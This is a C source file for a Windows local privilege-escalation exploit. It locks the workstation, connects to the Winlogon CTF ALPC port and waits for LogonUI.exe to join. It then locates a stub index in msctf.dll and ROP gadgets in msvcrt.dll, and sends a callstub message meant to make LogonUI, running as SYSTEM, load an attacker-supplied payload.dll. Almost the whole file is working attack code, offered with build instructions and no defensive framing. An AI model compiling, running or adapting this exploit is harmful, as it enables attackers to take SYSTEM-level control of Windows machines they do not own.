/*
 * ctf_alpc.c  -  CTF ALPC client, Winlogon desktop escalation
 *
 * 1. Lock workstation
 * 2. Connect to \BaseNamedObjects\msctf.serverWinlogon1
 * 3. Scan for LogonUI.exe in CTF client list
 * 4. Send callstub ROP -> LoadLibraryA(payload.dll) in LogonUI (SYSTEM)
 *
 * BUILD:
 *   cl.exe ctf_alpc.c /nologo /W3 /O2 /D_CRT_SECURE_NO_WARNINGS ^
 *       /link ntdll.lib advapi32.lib user32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* NTSTATUS may not be in Windows.h without winternl.h */
#ifndef NT_SUCCESS
typedef LONG NTSTATUS;
#define NT_SUCCESS(s)       ((NTSTATUS)(s) >= 0)
#define STATUS_TIMEOUT      ((NTSTATUS)0x00000102L)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#endif

/* ── Manual NT types (not in standard SDK user-mode headers) ───────────── */

typedef struct _MY_US {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} MY_US;

typedef struct _MY_OA {
    ULONG   Length;
    HANDLE  RootDirectory;
    MY_US  *ObjectName;
    ULONG   Attributes;
    PVOID   SecurityDescriptor;
    PVOID   SecurityQualityOfService;
} MY_OA;

/* PORT_MESSAGE - DDK only; define manually.
   No anonymous unions so it compiles in C89 mode. */
typedef struct _MY_PM {
    USHORT  DataLength;
    USHORT  TotalLength;
    USHORT  Type;
    USHORT  DataInfoOffset;
    HANDLE  UniqueProcess;
    HANDLE  UniqueThread;
    ULONG   MessageId;
    ULONG_PTR ClientViewSize;
} MY_PM;

#define ALPC_MAX 4096
typedef struct { MY_PM hdr; BYTE data[ALPC_MAX]; } MY_MSG;

typedef struct {
    ULONG   Flags;
    ULONG   SecurityQos[3];   /* ImpersonationLevel, ContextTrackingMode, EffectiveOnly */
    SIZE_T  MaxMessageLength;
    SIZE_T  MemoryBandwidth;
    SIZE_T  MaxPoolUsage;
    SIZE_T  MaxSectionSize;
    SIZE_T  MaxViewSize;
    SIZE_T  MaxTotalSectionSize;
    ULONG   DupObjectTypes;
} MY_ALPC_ATTR;

/* ── ALPC function pointers ─────────────────────────────────────────────── */

typedef NTSTATUS (__stdcall *FN_Connect)(
    HANDLE *,    /* PortHandle */
    MY_US  *,    /* PortName */
    MY_OA  *,    /* ObjectAttributes */
    MY_ALPC_ATTR *, /* PortAttributes */
    ULONG,       /* Flags */
    PSID,        /* RequiredServerSid */
    MY_PM  *,    /* ConnectionMessage */
    ULONG  *,    /* BufferLength */
    PVOID,       /* OutMessageAttributes */
    PVOID,       /* InMessageAttributes */
    LARGE_INTEGER *); /* Timeout */

typedef NTSTATUS (__stdcall *FN_SWR)(
    HANDLE,      /* PortHandle */
    ULONG,       /* Flags */
    MY_PM  *,    /* SendMessage */
    PVOID,       /* SendMessageAttributes */
    MY_PM  *,    /* ReceiveMessage */
    ULONG  *,    /* BufferLength */
    PVOID,       /* ReceiveMessageAttributes */
    LARGE_INTEGER *); /* Timeout */

typedef VOID (__stdcall *FN_Rtl)(MY_US *, PCWSTR);

static FN_Connect g_Connect;
static FN_SWR     g_SWR;
static FN_Rtl     g_Rtl;
static HANDLE     g_Port = NULL;

/* ── CTF protocol ────────────────────────────────────────────────────────── */

#define CTF_MAGIC        0x43544649u
#define CTF_MSG_CONNECT  0x0001
#define CTF_MSG_SCAN     0x0004
#define CTF_MSG_MKSTUB   0x000B
#define CTF_MSG_CALLSTUB 0x000A

#pragma pack(push,1)
typedef struct { DWORD Magic; WORD Msg; WORD Pad;
                 DWORD Tid; DWORD Pid; DWORD Tick; DWORD cbData; } CTF_HDR;
typedef struct { DWORD Tid; DWORD Pid; WCHAR Name[260]; } CTF_CLIENT;
#pragma pack(pop)

static const GUID IID_IEnumProf =
    {0x5c403B6,0xCF5B,0x4E27,{0x8A,0x0F,0xBB,0x7A,0x82,0xDD,0x73,0x80}};
static const GUID CLSID_TM =
    {0x529A9E6B,0x6587,0x4F23,{0xAB,0x9E,0x9C,0x7D,0x68,0x3E,0x3C,0x50}};

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static void SetMsgHdr(MY_MSG *m, WORD type, DWORD cbPayload) {
    DWORD total = sizeof(CTF_HDR) + cbPayload;
    m->hdr.DataLength  = (USHORT)total;
    m->hdr.TotalLength = (USHORT)(sizeof(MY_PM) + total);
    {
        CTF_HDR *h = (CTF_HDR *)m->data;
        h->Magic  = CTF_MAGIC;
        h->Msg    = type;
        h->Pad    = 0;
        h->Tid    = GetCurrentThreadId();
        h->Pid    = GetCurrentProcessId();
        h->Tick   = GetTickCount();
        h->cbData = cbPayload;
    }
}

static BOOL SendRecv(MY_MSG *send, BYTE *respOut, DWORD *cbOut) {
    MY_MSG   recv  = {0};
    ULONG    rsz   = sizeof(recv);
    NTSTATUS st    = g_SWR(g_Port, 0x20000, &send->hdr, NULL,
                           &recv.hdr, &rsz, NULL, NULL);
    if (!NT_SUCCESS(st) && st != STATUS_TIMEOUT) {
        printf("[-] AlpcSWR: 0x%08lx\n", (ULONG)st); return FALSE;
    }
    {
        DWORD dlen = (rsz > sizeof(MY_PM)) ? (DWORD)(rsz - sizeof(MY_PM)) : 0;
        if (cbOut)  *cbOut = dlen;
        if (respOut && dlen) memcpy(respOut, recv.data, dlen);
    }
    return TRUE;
}

/* ── Connection ──────────────────────────────────────────────────────────── */

static BOOL CtfConnect(DWORD sesId) {
    wchar_t name[128];
    MY_US   uname;
    MY_ALPC_ATTR attr;
    MY_MSG  conn;
    ULONG   connSz;
    NTSTATUS st;

    swprintf(name, 127, L"\\BaseNamedObjects\\msctf.serverWinlogon%lu", sesId);
    uname.Buffer = name;
    uname.Length = (USHORT)(wcslen(name) * sizeof(wchar_t));
    uname.MaximumLength = uname.Length + (USHORT)sizeof(wchar_t);

    memset(&attr, 0, sizeof(attr));
    attr.MaxMessageLength = sizeof(MY_MSG);

    /* Build connection message: CTF hello with user SID string appended.
       ctftool "connect Winlogon sid" embeds the SID - server validates it. */
    {
        wchar_t sidStr[256] = {0};
        HANDLE hTok = NULL;
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok);
        if (hTok) {
            DWORD cb = 0; GetTokenInformation(hTok, TokenUser, NULL, 0, &cb);
            PTOKEN_USER pu = (PTOKEN_USER)LocalAlloc(LPTR, cb);
            if (GetTokenInformation(hTok, TokenUser, pu, cb, &cb)) {
                wchar_t *ps = NULL;
                ConvertSidToStringSidW(pu->User.Sid, &ps);
                if (ps) { wcsncpy(sidStr, ps, 255); LocalFree(ps); }
            }
            LocalFree(pu); CloseHandle(hTok);
        }
        printf("[*] Connecting as SID: %ls\n", sidStr);

        /* Payload: DWORD flags(0) + SID wide string */
        DWORD sidLen = (DWORD)((wcslen(sidStr)+1) * sizeof(wchar_t));
        DWORD cbPayload = sizeof(DWORD) + sidLen;
        BYTE *pay = (BYTE*)malloc(cbPayload);
        if (!pay) return FALSE;
        memset(pay, 0, cbPayload);
        memcpy(pay + sizeof(DWORD), sidStr, sidLen);

        memset(&conn, 0, sizeof(conn));
        SetMsgHdr(&conn, CTF_MSG_CONNECT, cbPayload);
        memcpy(conn.data + sizeof(CTF_HDR), pay, cbPayload);
        free(pay);
    }
    connSz = sizeof(conn);

    printf("[*] Connecting to %ls ...\n", name);
    /* Use Flags=0 for connection (not SYNC - server does the accept/reject) */
    st = g_Connect(&g_Port, &uname, NULL, &attr, 0,
                   NULL, &conn.hdr, &connSz, NULL, NULL, NULL);

    if (!NT_SUCCESS(st)) {
        printf("[-] NtAlpcConnectPort: 0x%08lx\n", (ULONG)st);
        if (st == STATUS_OBJECT_NAME_NOT_FOUND)
            printf("    Port not found - workstation may not be locked\n");
        else if ((ULONG)st == 0xC0000022UL)
            printf("    Access denied\n");
        else if ((ULONG)st == 0xC0000041UL)
            printf("    Connection refused - server rejected our hello (wrong format?)\n");
        return FALSE;
    }
    printf("[+] Connected!\n");
    if (connSz > sizeof(MY_PM)) {
        DWORD dlen = connSz - (DWORD)sizeof(MY_PM);
        BYTE *d = conn.data;
        printf("[*] Connect response (%lu bytes): ", dlen);
        { DWORD i; for (i=0;i<dlen&&i<48;i++) printf("%02x ",d[i]); }
        printf("\n");
    }
    return TRUE;
}

/* ── Receive loop - CTF is server-push ──────────────────────────────────── */
/*
 * After connecting, the server pushes messages to us rather than answering
 * our requests.  We do receive-only calls (NULL send) and watch for
 * CTF_MSG_CONNECT (0x01) echoes which contain the joining client's PID/TID.
 */
static BOOL RecvLoop(DWORD *pTid, DWORD *pPid, int timeoutSec) {
    DWORD deadline = GetTickCount() + (DWORD)(timeoutSec * 1000);
    printf("[*] Listening for client-join events (%ds)...\n", timeoutSec);

    while (GetTickCount() < deadline) {
        MY_MSG  recv = {0};
        ULONG   rsz  = sizeof(recv);

        /* Receive-only: NULL send message, short timeout */
        LARGE_INTEGER timeout;
        timeout.QuadPart = -10000000LL; /* 1 second in 100-ns units */

        NTSTATUS st = g_SWR(g_Port, 0,
            NULL, NULL,
            &recv.hdr, &rsz,
            NULL, &timeout);

        if ((ULONG)st == 0x00000102UL) { /* STATUS_TIMEOUT */
            printf("  [waiting] ...\r"); fflush(stdout);
            continue;
        }
        if (!NT_SUCCESS(st)) {
            printf("\n[-] Recv: 0x%08lx\n", (ULONG)st); break;
        }

        /* Got a message - dump it */
        DWORD dlen = rsz > sizeof(MY_PM) ? rsz - (DWORD)sizeof(MY_PM) : 0;
        printf("\n[+] Server msg (%lu bytes): ", dlen);
        { DWORD i; for(i=0;i<dlen&&i<64;i++) printf("%02x ",recv.data[i]); }
        printf("\n");

        if (dlen >= sizeof(CTF_HDR)) {
            CTF_HDR *h = (CTF_HDR *)recv.data;
            printf("    Magic=%08lx Msg=%04x Tid=%lu Pid=%lu cbData=%lu\n",
                   h->Magic, h->Msg, h->Tid, h->Pid, h->cbData);

            /* Any message from a joining client tells us their PID/TID */
            if (h->Pid && h->Tid) {
                /* Get process name */
                char pname[64] = "<unknown>";
                HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                        FALSE, h->Pid);
                if (hp) {
                    char buf[MAX_PATH]; DWORD sz = MAX_PATH;
                    QueryFullProcessImageNameA(hp, 0, buf, &sz);
                    /* extract basename */
                    char *p = buf + sz;
                    while (p > buf && *(p-1) != '\\') p--;
                    strncpy(pname, p, 63);
                    CloseHandle(hp);
                }
                printf("    >> Client: PID=%-6lu TID=%-6lu  %s\n",
                       h->Pid, h->Tid, pname);

                if (_stricmp(pname, "LogonUI.exe") == 0 && pTid) {
                    *pTid = h->Tid; *pPid = h->Pid;
                    printf("[+] LogonUI.exe found!\n");
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

/* ── Gadget finder ───────────────────────────────────────────────────────── */

static ULONG_PTR FindGadget(const char *dll,
                             const BYTE *pat, DWORD plen,
                             ULONG_PTR *pBase) {
    HMODULE h = LoadLibraryExA(dll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    WORD i;
    if (!h) { printf("[-] LoadLibrary(%s) failed\n", dll); return 0; }
    if (pBase) *pBase = (ULONG_PTR)h;
    dos = (PIMAGE_DOS_HEADER)h;
    nt  = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
    sec = IMAGE_FIRST_SECTION(nt);
    for (i=0;i<nt->FileHeader.NumberOfSections;i++,sec++) {
        BYTE *s; DWORD j;
        if (strncmp((char*)sec->Name,".text",5)!=0) continue;
        s = (BYTE*)h + sec->VirtualAddress;
        for (j=0; j+plen<=sec->Misc.VirtualSize; j++) {
            if (memcmp(s+j,pat,plen)==0) {
                ULONG_PTR rva = sec->VirtualAddress + j;
                printf("[+] %-14s gadget RVA=0x%llx\n", dll,
                       (unsigned long long)rva);
                FreeLibrary(h);
                return rva;
            }
        }
        printf("[-] Gadget not found in %s\n", dll);
        break;
    }
    FreeLibrary(h);
    return 0;
}

static DWORD FindFuncIdx(void) {
    HMODULE h;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    WORD i;
    BYTE pat[] = {0x48,0x8B,0x41,0x30,0x48,0x8B,0x49,0x38};
    ULONG_PTR reconvert = 0;

    h = LoadLibraryExA("msctf.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!h) return 475;
    dos = (PIMAGE_DOS_HEADER)h;
    nt  = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
    sec = IMAGE_FIRST_SECTION(nt);

    for (i=0;i<nt->FileHeader.NumberOfSections;i++) {
        BYTE *s; DWORD j;
        if (strncmp((char*)sec[i].Name,".text",5)!=0) continue;
        s = (BYTE*)h + sec[i].VirtualAddress;
        for (j=0; j+sizeof(pat)<=sec[i].Misc.VirtualSize; j++) {
            if (memcmp(s+j,pat,sizeof(pat))==0) {
                reconvert = (ULONG_PTR)h + sec[i].VirtualAddress + j;
                break;
            }
        }
        break;
    }
    if (!reconvert) { FreeLibrary(h); return 475; }

    for (i=0;i<nt->FileHeader.NumberOfSections;i++) {
        BYTE *s; DWORD j;
        if (strncmp((char*)sec[i].Name,".rdata",6)!=0) continue;
        s = (BYTE*)h + sec[i].VirtualAddress;
        for (j=0; j+sizeof(ULONG_PTR)<=sec[i].Misc.VirtualSize; j+=sizeof(ULONG_PTR)) {
            if (*(ULONG_PTR*)(s+j)==reconvert) {
                DWORD idx = j / (DWORD)sizeof(ULONG_PTR);
                printf("[+] CTipProxy::Reconvert at stub table index %lu\n", idx);
                FreeLibrary(h);
                return idx;
            }
        }
        break;
    }
    FreeLibrary(h);
    return 475;
}

/* ── Exploit ─────────────────────────────────────────────────────────────── */

static void Exploit(DWORD funcIdx, const char *path) {
    /* mkstub */
    struct { DWORD clientId; DWORD stubId; GUID clsid; GUID iid; } mk;
    MY_MSG mkmsg = {0};
    BYTE mkresp[512]={0}; DWORD cbmk=0;

    memset(&mk,0,sizeof(mk));
    mk.clientId = 0; mk.stubId = 4;
    mk.clsid = CLSID_TM; mk.iid = IID_IEnumProf;
    SetMsgHdr(&mkmsg, CTF_MSG_MKSTUB, (DWORD)sizeof(mk));
    memcpy(mkmsg.data + sizeof(CTF_HDR), &mk, sizeof(mk));

    printf("[*] Creating stub...\n");
    SendRecv(&mkmsg, mkresp, &cbmk);
    { DWORD i; printf("    mkstub resp: ");
      for(i=0;i<cbmk&&i<16;i++) printf("%02x ",mkresp[i]); printf("\n\n"); }

    /* callstub */
    {
        struct { DWORD clientId; DWORD stubId; DWORD funcIdx;
                 DWORD cbArgs; char pathBuf[256]; } cs;
        MY_MSG csmsg = {0};
        BYTE csresp[512]={0}; DWORD cbcs=0;

        memset(&cs,0,sizeof(cs));
        cs.clientId = 0; cs.stubId = 4;
        cs.funcIdx  = funcIdx; cs.cbArgs = 256;
        strncpy(cs.pathBuf, path, 255);

        SetMsgHdr(&csmsg, CTF_MSG_CALLSTUB, (DWORD)sizeof(cs));
        memcpy(csmsg.data + sizeof(CTF_HDR), &cs, sizeof(cs));

        printf("[*] Sending callstub (funcIdx=%lu) -> LoadLibraryA(\"%s\")...\n",
               funcIdx, path);
        SendRecv(&csmsg, csresp, &cbcs);
        { DWORD i; printf("    callstub resp: ");
          for(i=0;i<cbcs&&i<16;i++) printf("%02x ",csresp[i]); printf("\n"); }
    }
}

/* ── main ────────────────────────────────────────────────────────────────── */

int main(int argc, char **argv) {
    HMODULE hNtdll;
    DWORD   funcIdx, sesId=1;
    ULONG_PTR b=0;
    BYTE gDec[] = {0xF0,0xFF,0x88,0x60,0x01,0x00,0x00};
    const char *path = argc>=2 ? argv[1] : "C:\\Temp\\payload.dll";
    DWORD luTid=0, luPid=0;
    int   i;

    printf("=== CTF ALPC Client ===\n\n[*] Payload: %s\n\n", path);

    hNtdll = GetModuleHandleA("ntdll.dll");
    g_Rtl     = (FN_Rtl)    GetProcAddress(hNtdll, "RtlInitUnicodeString");
    g_Connect = (FN_Connect) GetProcAddress(hNtdll, "NtAlpcConnectPort");
    g_SWR     = (FN_SWR)     GetProcAddress(hNtdll, "NtAlpcSendWaitReceivePort");
    if (!g_Rtl || !g_Connect || !g_SWR) {
        printf("[-] ALPC functions not found\n"); return 1; }

    printf("[*] Scanning msctf.dll for stub table index...\n");
    funcIdx = FindFuncIdx();
    printf("[*] Index: %lu\n\n", funcIdx);

    /* Try multiple known msvcrt dec-gadget patterns (Win10 vs Win11 builds) */
    {
        BYTE g2[] = {0xF0,0xFF,0x88,0x60,0x01,0x00};
        BYTE g3[] = {0xF0,0xFF,0x88};
        if (!FindGadget("msvcrt.dll", gDec, sizeof(gDec), &b))
        if (!FindGadget("msvcrt.dll", g2, sizeof(g2), &b))
            FindGadget("msvcrt.dll", g3, 3, &b);
    }

    printf("[*] Locking workstation...\n");
    LockWorkStation();
    Sleep(3000);

    ProcessIdToSessionId(GetCurrentProcessId(), &sesId);
    if (!CtfConnect(sesId)) return 1;

    printf("\n[*] Waiting for LogonUI.exe to join CTF session...\n");
    printf("[*] (lock screen should already be showing - unlock to trigger LogonUI)\n\n");
    RecvLoop(&luTid, &luPid, 60);
    printf("\n");

    if (!luTid) {
        printf("[-] LogonUI.exe not in CTF client list\n");
        printf("[!] Check raw scan bytes above for actual protocol format\n");
        CloseHandle(g_Port); return 1;
    }
    printf("[+] LogonUI.exe: PID=%lu TID=%lu\n\n", luPid, luTid);
    Exploit(funcIdx, path);

    CloseHandle(g_Port);
    return 0;
}
